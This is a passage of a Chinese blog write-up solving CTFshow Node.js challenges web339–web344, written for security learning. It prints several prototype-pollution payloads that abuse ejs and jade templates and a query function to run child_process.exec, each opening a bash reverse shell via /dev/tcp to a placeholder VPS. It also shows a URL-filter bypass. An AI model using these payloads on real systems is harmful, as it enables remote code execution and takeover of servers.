+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们用exec执行反弹shell，因为exec是异步的，适用于长时间&#x2F;交互式&#x2F;不需要立即结果的任务（例如反弹 shell、启动后台进程、并发执行多任务）。这题的目标不是“读取输出”，而是“建立外部控制会话”，因此异步 exec 足以完成“执行命令”的动作，而且更贴合反连的使用场景：父进程不被阻塞，持续提供服务</p>
+<p>先在VPS处开启<code>nc</code>监听，然后跟上题一样，在<code>/login</code>处传入payload</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813114617857.png"></p>
+<p>接着POST访问<code>/api</code>即可建立连接</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813114957019.png"></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813114917719.png"></p>
+<p>执行命令<code>env</code>，在环境变量里成功找到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813115850012.png"></p>
+<h3 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h3><p>下载源码进行分析，也是先看<code>app.js</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813201348782.png"></p>
+<p>可以看到，还是这几个文件，不过不同的是，<code>login.js</code>里面的user变量变了</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813201624962.png"></p>
+<p>要求<code>isAdmin</code>为true才可以通过，但是<code>isAdmin</code>已经被赋值为false了，因此在这里没办法污染</p>
+<p>继续分析，可以看到<code>api.js</code>跟上题一样，因此可以用上题的方法来污染query反弹shell</p>
+<p>但是如果直接传入<code>__proto__</code>，再访问<code>/api</code>会发现行不通</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813202719540.png"></p>
+<p>需要污染两层才可以，因为<code>user.__proto__</code>不是<code>Object.prototype</code>，<code>user.__proto.__proto__</code>才是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813203743959.png"></p>
+<p>也是在环境变量处找到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813203902301.png"></p>
+<p>下面详细解释一下为什么<code>user.__proto__</code>不是指向<code>Object.prototype</code>，开启本地调试，先在web340项目文件夹处打开终端，运行 <code>npm install</code>安装依赖</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813204211882.png"></p>
+<p>然后在项目文件夹处打开package.json，可以看到<strong>负责启动服务器</strong>的是<code>bin/www</code>，因为在很多标准的Express项目中，项目结构是分离的</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813204457722.png"></p>
+<p>修改配置文件的工作目录为web340，文件为<code>bin/www</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813204802599.png"></p>
+<p>在<code>www</code>文件中，可以看到运行的端口是在3000</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813204914963.png"></p>
+<p>在<code>login.js</code>的第19行开启断点调试，然后网页打开<a href="http://127.0.0.1:3000，在登录框随便输入点东西，触发`if(user.userinfo.isAdmin){`判断">http://127.0.0.1:3000，在登录框随便输入点东西，触发`if(user.userinfo.isAdmin){`判断</a></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813205642028.png"></p>
+<p>可以看到userinfo的<code>__proto__</code>后<code>__proto__</code>才是Object的<code>prototype</code>，为了更直观，我们在控制台输出看看</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813210054705.png"></p>
+<p>对于user这个变量</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">//这是外层匿名构造函数</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">//这是内层匿名构造函数</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>user.userinfo</code> 对象是由内层构造函数创建的，所以 <code>user.userinfo.__proto__</code> 指向内层构造函数的<code>prototype</code></p>
+<p>而内层构造函数的<code>__proto__</code>指向的才是Object的<code>prototype</code></p>
+<p>所以这就是为什么要传入两次的原因</p>
+<p><strong>拓展概念</strong></p>
+<p>只有函数才拥有 <code>prototype</code> 属性，而由构造函数创建出来的普通对象实例没有这个属性</p>
+<p>例如<code>user.userinfo</code>是一个<strong>对象实例</strong>，但它没有属于自己的 <code>prototype</code> 属性，控制台输出为<code>undefined</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813211513738.png"></p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>谁拥有</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>prototype</code></td>
+<td>构造函数</td>
+<td>定义实例继承的“蓝图”</td>
+</tr>
+<tr>
+<td><code>__proto__</code></td>
+<td>任意对象实例（包括函数对象）</td>
+<td>一个指向其构造器的 <code>prototype</code> 的引用指针</td>
+</tr>
+</tbody></table>
+<h3 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h3><p>下载附件分析代码，发现这题没有<code>api.js</code>了，而且<code>login.js</code>也没有地方污染</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813223720736.png"></p>
+<p>继续分析代码，在<code>app.js</code>可以看到包含了ejs，且引擎设置为ejs</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813224859620.png"></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813232421761.png"></p>
+<p>网上搜了一下，发现<strong>ejs模板引擎</strong>有个漏洞可以利用，实现<strong>从原型链污染到RCE</strong></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟上题一样，也是在<code>/login</code>里POST写入，然后<strong>刷新一次页面</strong>即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813225514864.png"></p>
+<p>在<code>env</code>找到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813225743400.png"></p>
+<h3 id="web342"><a href="#web342" class="headerlink" title="web342"></a>web342</h3><p>下载代码分析，总体跟上题代码差不多，但是<code>app.js</code>这两个地方不同</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813232321669.png"></p>
+<p>模板引擎换成了<strong>jade</strong>，上网参考了部分文章，链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6621">再探 JavaScript 原型链污染到 RCE</a></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟上题一样，在<code>/login</code>里POST写入，然后<strong>刷新一次页面</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813234149899.png"></p>
+<p>在<code>env</code>找到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813234333039.png"></p>
+<h3 id="web343"><a href="#web343" class="headerlink" title="web343"></a>web343</h3><p>这题在web342的基础上增加了过滤，但是影响不大，可以继续用上题的方法</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/login</code>里POST写入，然后<strong>刷新一次页面</strong></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813235152689.png"></p>
+<p>在环境变量中读取flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813235308095.png"></p>
+<p>后面看了一下<code>login.js</code>到底过滤了什么</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813235855849.png"></p>
+<p>只过滤了<code>text</code>，没什么用</p>
+<h3 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h3><p>这题给出了部分代码，先分析一下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>过滤了<strong>8c、2c和逗号</strong>，然后要求<strong>GET</strong>传入参数<strong>query</strong>，且满足 <code>query.name===&#39;admin&#39;&amp;&amp;query.password===&#39;ctfshow&#39;&amp;&amp;query.isVIP===true</code> 才可以拿到flag</p>
+<p>也就是正常情况下我们应该传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而经过URL编码之后变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=%7B%22name%22%3A%22admin%22%2C%22password%22%3A%22ctfshow%22%2C%22isVIP%22%3Atrue%7D</span><br></pre></td></tr></table></figure>
+
+<p>双引号编码之后是<code>%22</code>，和c连接起来就是<code>%22c</code>，会被ban</p>
+<p>这题用到了<strong>NodeJS的特性</strong>，当 URL 里传入了多个同名参数，如多次出现 <code>query=</code>，Express 解析会将这些参数放入数组中，然后<code>JSON.parse</code> 会将数组的字符串元素拼接成一个完整字符串再解析。同时<code>c</code>也要进行URL编码，变成<code>%63</code>，这样就不会被ban了</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250814002612463.png"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>bfengj：<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115218397">CTFshow-WEB入门-node.js</a></p>
+<p>yu22x：[CTFSHOW nodejs篇](<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/111780832?ops_request_misc=elastic_search_misc&request_id=652f8b947cee0d2ff3563e6cc4fff210&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-111780832-null-null.142%5Ev102%5Epc_search_result_base3&utm_term=ctfshow">https://blog.csdn.net/miuzzx/article/details/111780832?ops_request_misc=elastic_search_misc&amp;request_id=652f8b947cee0d2ff3563e6cc4fff210&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-111780832-null-null.142^v102^pc_search_result_base3&amp;utm_term=ctfshow</a> nodejs&amp;spm&#x3D;1018.2226.3001.4187)</p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>CTFSHOW | nodejs题解 web334 - web344</p><p><a href="https://waynejoon.github.io/posts/ctfshow-nodejs-web334-web344/">https://waynejoon.github.io/posts/ctfshow-nodejs-web334-web344/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>WayneJoon.H</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-08-14</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/CTFSHOW/">CTFSHOW, </a><a class="link-muted" rel="tag" href="/tags/CTF%E7%BB%83%E4%B9%A0/">CTF练习 </a></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/ctfshow-phpcve-web311-web315/"><span class="level-item">CTFSHOW | phpCVE题解 web311 - web315</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/waynejoon.jpg" alt="WayneJoon.H"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">WayneJoon.H</p><p class="is-size-6 is-block">记录学习生活</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">12</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">5</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/waynejoon" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#什么是nodejs"><span class="level-left"><span class="level-item">1</span><span class="level-item">什么是nodejs</span></span></a></li><li><a class="level is-mobile" href="#题目列表"><span class="level-left"><span class="level-item">2</span><span class="level-item">题目列表</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web334"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">web334</span></span></a></li><li><a class="level is-mobile" href="#web335"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">web335</span></span></a></li><li><a class="level is-mobile" href="#web336"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">web336</span></span></a></li><li><a class="level is-mobile" href="#web337"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">web337</span></span></a></li><li><a class="level is-mobile" href="#web338"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">web338</span></span></a></li><li><a class="level is-mobile" href="#web339"><span class="level-left"><span class="level-item">2.6</span><span class="level-item">web339</span></span></a></li><li><a class="level is-mobile" href="#web340"><span class="level-left"><span class="level-item">2.7</span><span class="level-item">web340</span></span></a></li><li><a class="level is-mobile" href="#web341"><span class="level-left"><span class="level-item">2.8</span><span class="level-item">web341</span></span></a></li><li><a class="level is-mobile" href="#web342"><span class="level-left"><span class="level-item">2.9</span><span class="level-item">web342</span></span></a></li><li><a class="level is-mobile" href="#web343"><span class="level-left"><span class="level-item">2.10</span><span class="level-item">web343</span></span></a></li><li><a class="level is-mobile" href="#web344"><span class="level-left"><span class="level-item">2.11</span><span class="level-item">web344</span></span></a></li></ul></li><li><a class="level is-mobile" href="#参考"><span class="level-left"><span class="level-item">3</span><span class="level-item">参考</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">WayneJH</a><p class="is-size-7"><span>&copy; 2025 WayneJoon.H</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="GitHub" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script data-pjax src="/js/column.js"></script><script data-pjax src="/js/busuanzi-fix.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
